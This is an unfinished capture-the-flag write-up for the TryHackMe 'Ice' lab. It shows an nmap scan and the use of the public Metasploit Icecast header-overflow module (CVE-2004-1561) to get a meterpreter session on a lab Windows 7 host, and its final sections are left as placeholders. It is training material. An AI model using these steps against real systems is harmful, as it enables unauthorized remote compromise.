# CTF Writeup: TryHackMe - Ice

## Challenge Description

Deploy & hack into a Windows machine, exploiting a very poorly secured media server.

https://tryhackme.com/room/ice

## Solution

### Reconnaissance

Let's begin by conducting a scan of the machine to identify any open ports. We then notice Icecast is running on port 8000, RDP on port 3389 and the hostname of the machine is DARK-PC.

```
$ nmap -sC -sV 10.10.58.222
...
Not shown: 988 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=Dark-PC
| Not valid before: 2023-01-28T15:22:55
|_Not valid after:  2023-07-30T15:22:55
|_ssl-date: 2023-01-29T15:27:23+00:00; 0s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http          Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:E5:43:F5:04:E1 (Unknown)
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:e5:43:f5:04:e1 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-29T09:27:23-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-29 15:27:23
|_  start_date: 2023-01-29 15:22:54

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.17 seconds
```

### Gain Access

This machine is using a vulnerable version of Icecast which is a streaming media server.


> 1. What type of vulnerability does Icecast use ? https://www.cvedetails.com/cve/CVE-2004-1561/
> Execute Code Overflow

> 2. What is the CVE number for this vulnerability?
CVE-2004-1561
An exploit can be found on exploit-db here: https://www.exploit-db.com/exploits/568



Using msfconsole for exploitation
```
$ msfconsole
msf5 > search icecast
Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite

msf5 > use 0
msf5 exploit(windows/http/icecast_header) > run RHOSTS=10.10.58.222
...
meterpreter >
```

```
3. What is the full path (starting with exploit) for the exploitation module?
exploit/windows/http/icecast_header

4. What is the only required setting which currently is blank?
rhosts

```



### Step 3

[Description of third step goes here]

## Flag

[Flag goes here]
